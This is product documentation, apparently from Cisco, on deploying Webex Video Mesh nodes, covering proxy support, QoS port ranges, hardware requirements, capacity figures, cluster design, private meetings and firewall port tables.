#### Video Mesh Incompatibility with the Full Feature Webex Experience

If you enable the Full Featured Webex Experience for the Webex App, then the Webex App isn't supported with the Video Mesh Nodes. That feature currently sends signaling and media directly to Webex. Future releases will make the Webex App and Video Mesh compatible. By default, we did not enable that feature for customers with Video Mesh.

You might have issues with Video Mesh and the Full Featured Webex Experience:

* If you added Video Mesh to your deployment after the introduction of that feature.
* If you enabled that feature without knowing its impact on Video Mesh.

If you notice issues, contact you Cisco Account team to disable the Full Featured Webex Experience toggle.

### Quality of Service on Video Mesh Node

Video Mesh nodes conforms to recommended quality of service (QoS) best practices by enabling port ranges that allow you to differentiate audio and video streams in all flows to and from the Video Mesh nodes. This change will let you create QoS policies and effectively remark traffic to and from the Video Mesh Nodes.

Accompanying these port changes are QoS changes. Video Mesh nodes automatically mark media traffic from SIP registered endpoints (on-premises Unified CM or VCS Expressway registered) for both audio (EF) and video (AF41) separately with appropriate class of service and use well-known port ranges for specific media types.

The source traffic from the on-premises registered endpoints is always determined by the configuration on the call control (Unified CM or VCS Expressway).

For more information, see the QoS table at [Ports and Protocols Used by Video Mesh](#reference_931D7E96CA43B51A44E9A01B14BEB0F4) and the steps to enable or disable QoS in the [Video Mesh Deployment Task Flow](#task_2AD27F6E9E197C198A7A1E2A116AE361)

Webex App continue to connect to Video Mesh nodes over shared port 5004. These ports are also used by Webex App and endpoints for STUN reachability tests to Video Mesh nodes. Video Mesh node to Video Mesh node for cascades use the destination port range 10000–40000.

### Proxy Support for Video Mesh

Video Mesh supports explicit, transparent inspecting, and non-inspecting proxies. You can tie these proxies to your Video Mesh deployment so that you can secure and monitor traffic from the enterprise out to the cloud. This feature sends signaling and management https-based traffic to the proxy. For transparent proxies, network requests from Video Mesh nodes are forwarded to a specific proxy through enterprise network routing rules. You can use the Video Mesh admin interface for certificate management and the overall connectivity status after you implement the proxy with the nodes.

Media does not travel through the proxy. You must still open the required ports for media streams to reach the cloud directly. See [Ports and Protocols for Management](#reference_8C86E2F8F0B5ED4CDE2D1639D0144683).

The following proxy types are supported by Video Mesh:

* Explicit Proxy (inspecting or non-inspecting)—With explicit proxy, you tell the client (Video Mesh nodes) which proxy server to use. This option supports one of the following authentication types:

  + None—No further authentication is required. (For HTTP or HTTPS explicit proxy.)
  + Basic—Used for an HTTP user agent to provide a username and password when making a request, and uses Base64 encoding. (For HTTP or HTTPS explicit proxy.)
  + Digest—Used to confirm the identity of the account before sending sensitive information, and applies a hash function on the username and password before sending over the network. (For HTTPS explicit proxy.)
  + NTLM—Like Digest, NTLM is used to confirm the identity of the account before sending sensitive information. Uses Windows credentials instead of the username and password. This authentication scheme requires multiple exchanges to complete. (For HTTP explicit proxy.)
* Transparent Proxy (non-inspecting)—Video Mesh nodes are not configured to use a specific proxy server address and should not require any changes to work with a non-inspecting proxy.
* Transparent Proxy (inspecting)—Video Mesh nodes are not configured to use a specific proxy server address. No http(s) configuration changes are necessary on Video Mesh, however, the Video Mesh nodes need a root certificate so that they trust the proxy. Inspecting proxies are typically used by IT to enforce policies regarding which websites can be visited and types of content that are not permitted. This type of proxy decrypts all your traffic (even https).

### Supported Resolutions and Framerates for Video Mesh

This table covers the supported resolutions and framerates from a sender-receiver perspective in a meeting that is hosted on a Video Mesh node. The sender client (app or device) is across the top row of the table, whereas the receiver client is on the left side column of the table. The corresponding cell between the two participants captures the negotiated content resolution, frames per section, and audio source.

Resolution affects the call capacity on any Video Mesh node. For more information, see [Capacity for Video Mesh nodes](#Cisco_Reference.dita_9c943675-d864-40aa-8f98-f5bb2f633012).

The resolution and framerate value is combined as XXXpYY—For example, 720p10 means 720p at 10 frames per second.

The definition abbreviations (SD, HD, and FHD) in the sender row and receiver column refer to the upper resolution of the client or device:

* SD—Standard Definition (576p)
* HD—High Definition (720p)
* FHD—Full High Definition (1080p)

Table 2. Supported Resolutions and Framerates for Video Mesh
| **Receiver** | **Sender** | | | | | | |
| --- | --- | --- | --- | --- | --- | --- | --- |
|  | Webex App | Webex App Mobile | SIP Registered Devices (HD) | SIP Registered Devices (FHD) | Webex Registered Devices (SD) | Webex Registered Devices (HD) | Webex Registered Devices (FHD) |

### Requirements for Video Mesh

Video Mesh is available with the offers documented in [License Requirements for Hybrid Services](https://collaborationhelp.cisco.com/article/uuhc6x).

#### Call Control and Meeting Integration Requirements for Video Mesh

Call control and existing meetings infrastructure are not required to use Video Mesh, but you can integrate the two. If you're integrating Video Mesh with your call control and meeting infrastructure, make sure your environment meets the minimum criteria that are documented in the following table.

Table 1. Call Control and Meeting Requirements for Video Mesh
| Component Purpose | Minimum Supported Version |
| --- | --- |
| On-Premises call control | Cisco Unified Communications Manager, Release 11.5(1) SU3 or later. (We recommend the latest SU release.)  Cisco Expressway-C or E, Release X8.11.4 or later. (See the "Important Information" section in the [Expressway Release Notes](https://www.cisco.com/c/dam/en/us/td/docs/voice_ip_comm/expressway/release_note/Cisco-Expressway-Release-Note-X8-11-4.pdf) for more information.) |
| Meeting infrastructure | Webex Meetings WBS33 or later. (You can verify that your Webex site is on the correct platform if it has the Media Resource Type list available in the Cloud Collaboration Meeting Room site options.)    To ensure that your site is ready for Video Mesh, contact your customer success manager (CSM) or partner. |
| Failover handling | Cisco Expressway-C or E, Release X8.11.4 or later. (See the "Important Information" section in the [Expressway Release Notes](https://www.cisco.com/c/dam/en/us/td/docs/voice_ip_comm/expressway/release_note/Cisco-Expressway-Release-Note-X8-11-4.pdf) for more information.) |

Meetings and calls with guest user participants in the organization's network (users not registered to the organization) overflow to the cloud by default and do not land on Video Mesh.

#### Endpoint and Webex App Requirements

#### System and Platform Requirements for Video Mesh Node Software

##### Production Environments

In production deployments, there are two ways to deploy Video Mesh Node software on a particular hardware configuration:

* You can set up each server as a single virtual machine, which is best for
  deployments that include many SIP endpoints.
* Using the VMNLite option, you can set up each server with multiple smaller virtual machines. VMNLite is best for deployments where the majority of clients and devices are the Webex app and Webex registered endpoints.

These requirements are common for all configurations:

* VMware ESXi 7 or 8, vSphere 7 or 8
* Hyperthreading enabled

The Video Mesh nodes running independent of the platform hardware need dedicated vCPUs and RAM. Sharing resources with other applications is not supported. This applies to all images of the Video Mesh software.

For Video Mesh Lite (VMNLite) images on a CMS platform, we only support having VMNLite images. No other Video Mesh image or non-Video Mesh application can be on the CMS hardware with the VMNLite software.

Table 3. System and Platform Requirements for Video Mesh Node Software in a Production Environment
| Hardware Configuration | Production Deployment as a Single Virtual Machine | Production Deployment with VMNLite VMs | Notes |
| --- | --- | --- | --- |
| Cisco Meeting Server 1000 (CMS 1000) | * 72vCPUs (70 for Video Mesh Node, 2 for ESXi) * 60 GB main memory * 80 GB local hard disk space | Deploy as **3** identical virtual machine instances, each with:   * 23 vCPUs * 20 GB main memory * 80 GB local hard disk space | We recommend this platform for Video Mesh Node.  If you deploy VMNLite on a CMS 1000 with a 300 GB hard drive, you can run out of space when upgrading to ESXi 7. We recommend that you upgrade to at least 500 GB hard drives before upgrading VMware. |
| Specifications-based Configuration  (2.6-GHz Intel Xeon E5-2600v3 or later processor required) | * 72vCPUs (70 for Video Mesh Node, 2 for ESXi) * 60 GB main memory * 80 GB local hard disk space or  80 GB of NFS storage | Deploy as **3** identical virtual machine instances, each with:   * 23 vCPUs * 20 GB main memory * 80 GB local hard disk space  or  80 GB of NFS storage | Each Video Mesh virtual machine must have CPU, RAM and hard drives reserved for itself.  Use either the CMS1000 or VMNLite option during configuration.  Peak IOPs (input/output operations per second) for NFS storage is 300 IOPS. |

##### Demo Environments

For basic demo purposes, you can use a specifications-based hardware configuration,
with the following minimum requirements:

* 14vCPUs (12 for Video Mesh Node, 2 for ESXi)
* 8 GB main memory
* 20 GB local hard disk space
* 2.6 GHz Intel Xeon E5-2600v3 or later processor

This configuration of Video Mesh is not Cisco TAC supported.

For more information about the demo software, see [Video Mesh Node Demo Software](#reference_7BC7C9E0028397C404525D5EBE0F97F4).

##### Bandwidth Requirements

Video Mesh Nodes must have a minimum internet bandwidth of 10 Mbps for both upload and download to function properly.

#### Requirements for Proxy Support for Video Mesh

* We officially support the following proxy solutions that can integrate with your Video Mesh nodes.

  + Cisco Web Security Appliance (WSA) for transparent proxy
  + Squid for explicit proxy
* For an explicit proxy or transparent inspecting proxy that inspects (decrypts traffic), you must have a copy of the proxy's root certificate that you'll need to upload to the Video Mesh node trust store on the web interface.
* We support the following explicit proxy and authentication type combinations:

  + No authentication with http and https
  + Basic authentication with http and https
  + Digest authentication with https only
  + NTLM authentication with http only
* For transparent proxies, you must use the router/switch to force HTTPS/443 traffic to go to the proxy. You can also force Web Socket to go to proxy. (Web Socket uses https.)

  Video Mesh requires web socket connections to cloud services, so that the nodes function correctly. On explicit inspecting and transparent inspecting proxies, http headers are required for a proper websocket connection. If they are altered, the websocket connection will fail.

  When the websocket connection failure occurs on port 443 (with transparent inspecting proxy enabled), it leads to a post-registration warning in Control Hub: “Webex Video Mesh SIP calling is not working correctly.” The same alarm can occur for other reasons when proxy is not enabled. When websocket headers are blocked on port 443, media does not flow between apps and SIP clients.

  If media is not flowing, this often occurs when https traffic from the node over port 443 is failing:

  + Port 443 traffic is allowed by the proxy, but it is an inspecting proxy and is breaking the websocket.

  To correct these problems, you may have to “bypass” or “splice” (disable inspection) on port 443 to: \*.wbx2.com and \*.ciscospark.com.

### Capacity for Video Mesh nodes

Because Video Mesh is a software-based media product, the capacity of your Video Mesh nodes varies. In particular, meeting participants on the Webex cloud place a heavier load on nodes. You get lower capacities when you have more cascades to the Webex cloud. Other factors that impact capacity are:

* Types of devices and clients
* Video resolution
* Network quality
* Peak load
* Deployment model

Video Mesh usage doesn't impact your Webex license counts.

In general, adding more nodes to the cluster doesn't double the capacity because of the overhead for setting up cascades. Use these numbers as general guidance. We recommend the following:

* Test out common meeting scenarios for your deployment.
* Use the analytics in Control Hub to see how your deployment is evolving and add capacity as needed.

Overflows on low call volume (especially SIP calls that originate on-premises) aren't a true reflection of scale. Video Mesh analytics (under Control Hub > Resources > Call Activity) indicate the call legs that originate on-premises. They don't specify the call streams that came in through the cascade to the Video Mesh node for media processing. As remote participant numbers increase in a meeting, cascades increase and consume on-premises media resources on the Video Mesh node.

This table lists capacity ranges for different mixes participants and endpoints on regular Video Mesh nodes. Our testing included meetings with all participants on the local node and meetings with a mix of local and cloud participants. With more participants on the Webex cloud, expect your capacity to fall in the lower end of the range.

Table 4. Capacity on regular Video Mesh nodes
| Scenario | Resolution | Participant capacity |
| --- | --- | --- |
| Meetings with only Webex App participants | 720p | 100–130 |
| 1080p | 90–100 |
| Meetings and 1-to-1 calls with only Webex App participants | 720p | 60–100 |
| 1080p | 30–40 |
| Meetings with only SIP participants | 720p | 70–80 |
| 1080p | 30–40 |
| Meetings with Webex App and SIP participants | 720p | 75–110 |

* The base resolution for Webex App is 720p. But when you share, the participant thumbnails are at 180p.
* These performance numbers assume that you enabled all the recommended ports.

#### Capacity for VMNLite

We recommend VMNLite for deployments that mainly include Webex App and cloud-registered endpoints. In these deployments, the nodes use more switching and fewer transcoding resources than the standard configuration provides. Deploying several smaller virtual machines on the host optimizes resources for this scenario.

This table lists capacity ranges of different mixes participants and endpoints. Our testing included meetings with all participants on the local node and meetings with a mix of local and cloud participants. With more participants on the Webex cloud, expect your capacity to fall in the lower end of the range.

Table 5. Capacity on VMNLite nodes
| Scenario | Resolution | Participant capacity with 3 VMNLite nodes on a server |
| --- | --- | --- |
| Meetings with only Webex App participants | 720p | 250–300 |
| 1080p | 230–240 |
| Meetings and 1-to-1 calls with only Webex App participants | 720p | 175–275 |

The base resolution for Webex App meetings is 720p. But when you share, the participant thumbnails are at 180p.

### Clusters in Video Mesh

You deploy Video Mesh nodes in clusters. A cluster defines Video Mesh nodes with similar attributes, such
as network proximity. Participants use a particular cluster or the cloud, depending on
the following conditions:

* A client on a corporate network that can reach an on-premises cluster
  connects to it—the primary preference for clients on the corporate network.
* Clients joining a Video Mesh private meeting only connect to on-premise clusters.
  You can create a separate cluster specifically for these private meetings.
* A client that can't reach an on-premises cluster connects to the cloud—the
  case for a mobile device unconnected to the corporate network.
* The chosen cluster also depends on latency, rather than just location. For
  example, a cloud cluster with lower STUN round-trip (SRT) delay than a Video Mesh cluster may be a better candidate for the meeting. This logic prevents a user
  from landing on a geographically far cluster with a high SRT delay.

Each cluster contains logic that cascades meetings, except for Video Mesh private meetings, across other cloud meeting clusters, as needed. Cascading provides a data path for media between clients in their meetings. Meetings are distributed across nodes, and clients land on the most efficient node nearest to them, depending on factors such as network topology, WAN link, and resource utilization.

The client's ability to ping media nodes determines reachability. An actual call uses a variety
of potential connection mechanisms, such as UDP and TCP. Before the call, the Webex device (Room, Desk, Board, and Webex App) registers with the Webex cloud, which provides a list of cluster candidates for the call.

The nodes in a Video Mesh cluster require unimpeded communication with each other. They also require unimpeded communication with the nodes in all your other Video Mesh clusters. Ensure that your firewalls allow all communication between the Video Mesh nodes.

#### Clusters for Private Meetings

You can reserve a Video Mesh cluster for private meetings. When the reserved cluster
is full, the private meeting media cascades out to your other Video Mesh clusters.
When the reserved cluster is full, private meetings and non-private meetings share
the resources of your remaining clusters.

Non-private meetings won’t use a reserved cluster, reserving those resources for the
private meetings. If a non-private meeting runs out of resources on your network, it
cascades out to the Webex cloud instead.

For details on the Video Mesh private meetings feature, see [Private Meetings](#Cisco_Concept.dita_319a6c50-18c4-4007-a083-346760e6196e).

You can't use the short video address format (meet@your\_site)
if you reserve all Video Mesh clusters for private meetings. These calls
currently fail without a proper error message. If you leave some clusters
unreserved, calls with the short video address format can connect through those
clusters.

#### Guidelines for Video Mesh Cluster Deployment

* In typical enterprise deployments, we recommend that customers use up to 100
  nodes per cluster. There are no hard limits set in the system to block a cluster
  size with greater than 100 nodes. However, if you need to create larger
  clusters, we strongly recommend that you review this option with Cisco
  engineering through your Cisco Account Team.
* Create fewer clusters when resources have similar network proximity
  (affinity).
* When creating clusters, only add nodes that are in the same geographical region
  and the same data center. Clustering across the wide area network (WAN) is not
  supported.
* Typically, deploy clusters in enterprises that host frequent localized meetings.
  Plan where you place clusters on the bandwidth available at various WAN
  locations inside the enterprise. Over time, you can deploy and grow
  cluster-by-cluster based on observed user patterns.
* Clusters located in different time zones can effectively serve multiple
  geographies by taking advantage of different peak/busy hour calling
  patterns.
* If you have two Video Mesh nodes in two separate data centers (EU and NA, for example), and you have endpoints join through each data center, the nodes in each data center would cascade to a single Video Mesh node in the cloud. Theses cascades would go over the Internet. If there is a cloud participant (that joins before one of the Video Mesh participants), the nodes would be cascaded through the cloud participant’s media node.

##### Time Zone Diversity

Time zone diversity can allow clusters to be shared during off-peak times. For example: A company with a Northern California cluster and a New York cluster might find that overall network latency is not that high between the two locations that serve a geographically diverse user population. When resources are at peak usage in the Northern California cluster, the New York cluster is likely to be off peak and have additional capacity. The same applies for the Northern California cluster, during peak times in the New York cluster. These aren't the only mechanisms used for effective deployment of resources, but they are the two main ones.

##### Overflow to the Cloud

When the capacity of all on-premises clusters is reached, an on-premises participant overflows to the Webex cloud. This doesn't mean that all calls are hosted in the cloud. Webex only directs to the cloud those participants that are either remote or can't connect to an on-premises cluster. In a call with both on-premises and cloud participants, the on-premises cluster is bridged (cascaded) to the cloud to combine all participants into a single call.

If you set up the meeting as the private meeting type, Webex keeps all the calls on
your on-premises clusters. Private meetings never overflow to the cloud.

#### Webex Device Registers with Webex

In addition to determining reachability, the clients also perform periodic round-trip delay tests using Simple Traversal of UDP through NAT (STUN). STUN round-trip (SRT) delay is an important factor when selecting potential resources during an actual call. When multiple clusters are deployed, the primary selection criteria are based on the learned SRT delay. Reachability tests are performed in the background, initiated by a number of factors including network changes, and do not introduce delays that affect call setup times. The following two examples show possible reachability test outcomes.

#### Round-trip Delay Tests—Cloud Device Fails to Reach On-Premises Cluster

![](https://cisco-api.ingeniuxondemand.com/DITA/content/en/us/td/i/400001-500000/410001-420000/415001-416000/415868.jpg)

#### Round-trip Delay Tests—Cloud Device Successfully Reaches On-Premises Cluster

Learned reachability information is provided to the Webex cloud every time a call is set up. This information allows the cloud to select the best resource (cluster or cloud), depending on the relative location of the client to available clusters and the type of call. If no resources are available in the preferred cluster, all clusters are tested for availability based on SRT delay. A preferred cluster is chosen with the lowest SRT delay. Calls are served on premises from a secondary cluster when the primary cluster is busy. Local reachable Video Mesh resources are tried first, in order of lowest SRT delay. When all local resources are exhausted, the participant connects to the cloud.

Cluster definition and location is critical for a deployment that provides the best overall experience for participants. Ideally, a deployment should provide resources where the clients are located. If not enough resources are allocated where the clients make the majority of calls, more internal network bandwidth is consumed to connect users to distant clusters.

#### On-Premises and Cloud Call

On-premises Webex devices that have the same cluster affinity (preference, based on proximity to the cluster) connect to the same cluster for a call. On-premises Webex devices with different on-premises cluster affinities, connect to different clusters and the clusters then cascade to the cloud to combine the two environments into a single call. This creates a hub and spoke design with Webex cloud as the hub and the on-premises clusters acting as the spokes in the meeting.

#### On-Premises Call with Different Cluster Affinities

The Webex device connects to either on-premises cluster or cloud based upon its reachability. The following show examples of the most-common scenarios.

#### Webex Cloud Device Connects to Cloud

![](https://cisco-api.ingeniuxondemand.com/DITA/content/en/us/td/i/400001-500000/410001-420000/415001-416000/415870.jpg)

#### Webex On-Premises Device Connects to On-Premises Cluster

![](https://cisco-api.ingeniuxondemand.com/DITA/content/en/us/td/i/400001-500000/410001-420000/415001-416000/415871.jpg)

#### Webex On-Premises Device Connects to Cloud

![](https://cisco-api.ingeniuxondemand.com/DITA/content/en/us/td/i/400001-500000/410001-420000/415001-416000/415872.jpg)

#### Cloud Cluster Selection for Overflow Based on 250 ms or Higher STUN Round-Trip Delay

While the preference for node selection is your locally deployed Video Mesh nodes, we support a scenario where, if the STUN round-trip (SRT) delay to an on-premises Video Mesh cluster exceeds the tolerable round-trip delay of 250 ms (which usually happens if the on-premises cluster is configured in a different continent), then the system selects the closest cloud media node in that geography instead of a Video Mesh node.

![](https://cisco-api.ingeniuxondemand.com/DITA/content/en/us/td/i/400001-500000/420001-430000/426001-427000/426035.jpg)

* The Webex App or Webex device is on the enterprise network in San Jose.
* San Jose and Amsterdam clusters are at capacity or unavailable.
* SRT delay to the Shanghai cluster is greater than 250 ms and will likely introduce media quality issues.
* The San Francisco cloud cluster has an optimal SRT delay.
* The Shanghai Video Mesh cluster is excluded from consideration.
* As a result, the Webex App overflows to the San Francisco cloud cluster.

#### Private Meetings

Private meetings isolate all media to your network through Video Mesh. Unlike normal
meetings, if the local nodes are full, the media doesn't cascade to the Webex cloud.
But, by default, private meetings can cascade to different Video Mesh clusters on your
network. For private meetings across geographic locations, your Video Mesh clusters must
have direct connectivity to each other to allow intercluster cascades, like HQ1\_VMN to
Remote1\_VMN in the figure.

Make sure the necessary ports are open in your firewall, to allow unimpeded cascade between clusters. See [Ports and Protocols for Management](#reference_8C86E2F8F0B5ED4CDE2D1639D0144683).

All participants in a private meeting must belong to your meeting host's Webex organization. They can join using the Webex App or an authenticated video system (SIP endpoints registered to UCM/VCS or Webex registered video device). Participants with VPN or MRA access to your network can join a private meeting. But nobody can join a private meeting from outside your network.

### Deployment Models Supported by Video Mesh

**Supported in a Video Mesh Deployment**

* You can deploy a Video Mesh Node in either a data center (preferred) or demilitarized zone (DMZ). For guidance, see [Ports and Protocols Used by Video Mesh](#reference_931D7E96CA43B51A44E9A01B14BEB0F4).
* For a DMZ deployment, you can set up the Video Mesh nodes in a cluster with the dual network interface (NIC). This deployment lets you separate the internal enterprise network traffic (used for interbox communication, cascades between node clusters, and to access the node's management interface) from the external cloud network traffic (used for connectivity to the outside world and cascades to the cloud).

  Dual NIC works on the full, VMNLite and demo version of Video Mesh node software. You can also deploy the Video Mesh behind a 1:1 NAT setup.
* You can integrate Video Mesh nodes with your call control environment. For example deployments with Video Mesh integrated with Unified CM, see [Deployment Models For Video Mesh and Cisco Unified Communications Manager](#concept_AEF93A6610AFF17868FB34813435FC45).
* The following types of address translation are supported:

  + Dynamic Network Address Translation (NAT) using an IP pool
  + Dynamic Port Address Translation (PAT)
  + 1:1 NAT
  + Other forms of NAT should work as long as the correct ports and protocols are used, but we do not officially support them because they have not been tested.
* IPv4
* Static IP address for the Video Mesh Node
**Not Supported in a Video Mesh Deployment**

* IPv6
* DHCP for the Video Mesh Node
* A cluster with a mixture of single NIC and dual NIC
* Clustering Video Mesh nodes over the wide area network (WAN)
* Audio, video, or media that does not pass through a Video Mesh Node:

  + Audio from phones
  + Peer-to-peer call between Webex App and standards-based endpoint
  + Audio termination on Video Mesh Node
  + Media sent through Expressway C/E pair
  + Video call back from Webex

### Deployment Models For Video Mesh and Cisco Unified Communications Manager

These examples show common Video Mesh deployments and help you understand where Video Mesh clusters can fit in to your network. Keep in mind that Video Mesh deployment depends on factors in your network topology:

* Data center locations
* Office locations and size
* Internet access location and capacity

In general, try to tie the Video Mesh nodes to the Unified CM or Session Management Edition (SME) clusters. As a best practice, keep the nodes as centralized as possible to the local branches.

Video Mesh supports Session Management Edition (SME). Unified CM clusters can be connected through an SME, and then you must create a SME trunk that connects to the Video Mesh nodes.

#### Hub and Spoke Architecture

![](https://cisco-api.ingeniuxondemand.com/DITA/content/en/us/td/i/400001-500000/410001-420000/419001-420000/419335.jpg)

This deployment model involves centralized networking and internet access. Typically, the central location has a high employee concentration. In this case, a Video Mesh cluster can be located at central location for optimized media handling.

Locating clusters in
branch locations may not yield benefits in the short term and may
lead to suboptimal routing. We recommend that you deploy clusters in a branch
only if there is frequent communication between branches.

#### Geographic Distribution

![](https://cisco-api.ingeniuxondemand.com/DITA/content/en/us/td/i/400001-500000/410001-420000/419001-420000/419336.jpg)

The geographically distributed deployment is interconnected but can exhibit noticeable latency between regions. Lack of resources can cause suboptimal cascades to be setup in the short term when there are meetings between users in each geographical location. In this model, we recommend that you allocate of Video Mesh nodes near regional internet access.

#### Geographic Distribution with SIP Dialing

![](https://cisco-api.ingeniuxondemand.com/DITA/content/en/us/td/i/400001-500000/410001-420000/419001-420000/419337.jpg)

This deployment model contains regional Unified CM clusters. Each cluster can contain a SIP trunk to select resources in the local Video Mesh cluster. A second trunk can provide a failover path to an Expressway pair if resources become limited.

### Ports and Protocols Used by Video Mesh

To ensure a successful deployment of Video Mesh and for trouble-free operation of the Video Mesh nodes, open the following ports on your firewall for use with the protocols.

* See [Network Requirements for Webex Services](https://help.webex.com/en-US/article/WBX000028782/Network-Requirements-for-Webex-Services) to understand the overall network requirements for Webex Teams.
* See the [Firewall Traversal Whitepaper](https://www.cisco.com/c/dam/en/us/td/docs/voice_ip_comm/cloudCollaboration/spark/whitepapers/cisco-spark-firewall-traversal-white-paper.pdf) for more information about firewall and network practices for Webex services.
* To mitigate potential DNS query issues, follow the [DNS Best Practices, Network Protections, and Attack Identification](http://www.cisco.com/c/en/us/about/security-center/dns-best-practices.html) documentation when you configure your enterprise firewall.
* For more design information, see the [Preferred Architecture for Hybrid Services, CVD](https://www.cisco.com/c/dam/en/us/td/docs/solutions/CVD/Collaboration/hybrid/pa_hybrid_vmn.pdf).

#### Ports and Protocols for Management

***Ports and Protocols for Management***

The nodes in a Video Mesh cluster require unimpeded communication with each other. They also require unimpeded communication with the nodes in all your other Video Mesh clusters. Ensure that your firewalls allow all communication between the Video Mesh nodes.

The Video Mesh nodes in a cluster must be in the same VLAN or subnet mask.

| Purpose | Source | Destination | Source IP | Source Port | Transport Protocol | Destination IP | Destination Port |
| --- | --- | --- | --- | --- | --- | --- | --- |
| Management | Management computer | Video Mesh node | As required | Any | TCP, HTTPS | Video Mesh node | 443 |
| SSH for access to Video Mesh admin console | Management computer | Video Mesh node | As required | Any | TCP | Video Mesh node | 22 |
| Intracluster Communication | Video Mesh node | Video Mesh node | IP address of other Video Mesh nodes in the cluster | Any | TCP | Video Mesh nodes | 8443 |
| Management | Video Mesh node | Webex cloud | As required | Any | UDP, NTP  UDP, DNS  TCP, HTTPS (WebSockets) | Any | 123\*  53\* |
| Cascade Signaling | Video Mesh node | Webex cloud | Any | Any | TCP | Any | 443 |

| Cascade Signaling | Video Mesh Cluster (1) | Video Mesh Cluster (2) | Any | Any | TCP | Any | 443 |
| Cascade Media | Video Mesh Cluster (1) | Video Mesh Cluster (2) | Video Mesh Cluster (1) | Any\*\*\* | UDP | Any | 5004 and 9000 |
| Management | Video Mesh node | Webex cloud | As required | Any | TCP, HTTPS | Any\*\* | 443 |
| Management | Video Mesh node (1) | Video Mesh node (2) | Video Mesh node (1) | Any | TCP, HTTPS (WebSockets) | Video Mesh node (2) | 443 |
| Internal Communication | Video Mesh node | All other Video Mesh nodes | Video Mesh node | Any | UDP | Any | 10000 to 40000 |

\* The default configuration in the OVA is configured for NTP and DNS. The OVA requires that you open those ports outbound to the internet. If you configure a local NTP and DNS server, then you don't have to open ports 53 and 123 through the firewall.

\*\* Because some cloud service URLs are subject to change without warning, ANY is the recommended destination for trouble-free operation of the Video Mesh nodes. If you prefer to filter traffic based on URLs, see the Webex Teams URLs for Hybrid Services section of the [Network Requirements for Webex Services](https://help.webex.com/en-US/article/WBX000028782/Network-Requirements-for-Webex-Services) for more information.

\*\*\*The ports vary depending on if you enable QoS. With QoS enabled, the ports are 52,500-62999 and 63000-65500. With QoS off, the ports are 34,000-34,999.

#### Traffic Signatures for Video Mesh (Quality of Service Enabled)

For deployments where the Video Mesh node sits in the enterprise side of the DMZ or inside the firewall, there is a Video Mesh Node configuration setting in the Webex Control Hub that allows the administrator to optimize the port ranges used by the Video Mesh Node for QoS network marking. This Quality of Service setting is enabled by default and changes the source ports that are used for audio, video, and content sharing to the values in this table. This setting allows you to configure QoS marking policies based on UDP port ranges to differentiate audio from video or content sharing and mark all Audio with recommended value of EF and Video and Content sharing with a recommended value of AF41.

***Traffic Signatures for Video Mesh (Quality of Service Enabled)***

The table and diagram show UDP ports that are used for audio and video streams, which are the main focus of QoS network configurations. While network QoS marking policies for media over UDP are the focus of the following table, Webex Video Mesh nodes also terminate TCP traffic for presentation and content sharing for Webex app using ephemeral ports 52500–65500. If a firewall sits between the Video Mesh nodes and the Webex app, those TCP ports also must be allowed for proper functioning.

Video Mesh Node marks traffic natively. This native marking is asymmetric in some flows and depends on whether the source ports are shared ports (single port like 5004 for multiple flows to various destinations and destination ports) or whether they are not (where the port falls in a range but is unique to that specific bidirectional session).

To understand the native marking by a Video Mesh Node, note that the Video Mesh node marks audio EF when it is not using the 5004 port as a source port. Some bidirectional flows like Video Mesh to Video Mesh cascades or Video Mesh to Webex App will be asymmetrically marked, a reason to use the network to remark traffic based on the UDP port ranges provided.

| **Source IP Address** | **Destination IP Address** | **Source UDP Ports** | **Destination UDP Ports** | **Native DSCP Marking** | **Media Type** |
| --- | --- | --- | --- | --- | --- |
| Video Mesh Node | Webex cloud media services | 35000 to 52499 | 5004 | AF41 | Test STUN packets |
| Video Mesh Node | Webex cloud media services | 52500 to 62999 | 5004 and 9000 | EF | Audio |
| Video Mesh Node | Webex cloud media services | 63000 to 65500 | 5004 and 9000 | AF41 | Video |
| Video Mesh Node | Video Mesh Node | 10000 to 40000 | 10000 to 40000 | — | Audio |
| Video Mesh Node | Video Mesh Node | 10000 to 40000 | 10000 to 40000 | — | Video |
| Video Mesh Node | Unified CM SIP endpoints | 52500 to 59499 | Unified CM SIP Profile | EF | Audio |
| Video Mesh Node | Unified CM SIP endpoints | 63000 to 64667 | Unified CM SIP Profile | AF41 | Video |
| Video Mesh Cluster | Video Mesh Cluster | 52500 to 62999 | 5004 and 9000 | EF | Audio |
| Video Mesh Cluster | Video Mesh Cluster | 63000 to 65500 | 5004 and 9000 | AF41 | Video |
| Video Mesh Node | Webex Teams application or endpoint\* | 5004 | 52000 to 52099 | AF41 | Audio |
| Video Mesh Node | Webex Teams application or endpoint | 5004 | 52100 to 52299 | AF41 | Video |

\*The direction of media traffic determines the DSCP markings. If the source ports are from the Video Mesh node (from the Video Mesh node to Webex Teams app), the traffic is marked as AF41 only. Media traffic that originates from the Webex Teams app or Webex endpoints has the separate DSCP markings, but the return traffic from the Video Mesh node shared ports does not.

UDP Source Port Differentiation (Windows Webex App clients): Contact your local account team if you would like UDP Source Port Differentiation enabled for your organization. If this is not enabled, audio and video share cannot be differentiated by Windows OS. The source ports will be the same for audio, video and content share on Windows devices.

#### Traffic Signatures for Video Mesh (Quality of Service Disabled)

For deployments where the Video Mesh node sits in the DMZ, there is a Video Mesh Node configuration setting in the Webex Control Hub that allows you to optimize the port ranges used by the Video Mesh node. This Quality of Service setting, when disabled (enabled by default), changes the source ports that are used for audio, video, and content sharing from the Video Mesh node to the range 34000 to 34999. The Video Mesh node then natively marks all audio, video, and content sharing to a single DSCP of AF41.

Because the source ports are the same for all media regardless of destination, you cannot differentiate the audio from video or content sharing based on port range with this setting disabled. This configuration does let you configure firewall pin holes for media more easily that with Quality of Service enabled.

The table and diagram show UDP ports that are used for audio and video streams when
QoS is disabled.

#### Ports and Protocols for Webex Meetings Traffic

***Ports and Protocols for Webex Meetings***

| Purpose | Source | Destination | Source IP | Source Port | Transport Protocol | Destination IP | Destination Port |
| --- | --- | --- | --- | --- | --- | --- | --- |
| Calling to meeting | Apps (Webex App desktop and mobile apps)  Webex registered devices | Video Mesh node | As required | Any | UDP and TCP (Used by the Webex App)  SRTP (Any) | Any\*\* | 5004 |
| SIP device calling to meeting (SIP signaling) | Unified CM or Cisco Expressway call control | Video Mesh node | As required | Ephemeral (>=1024) | TCP or TLS | Any\*\* | 5060 or 5061 |
| Cascade | Video Mesh node | Webex cloud | As required | 34000 to 34999 | UDP, SRTP (Any)\* | Any\*\* | 5004 and 9000 |
| Cascade | Video Mesh node | Video Mesh node | As required | 34000 to 34999 | UDP, SRTP (Any)\* | Any\*\* | 5004 |

Port 5004 is used for all cloud media and on-premises Video Mesh nodes.

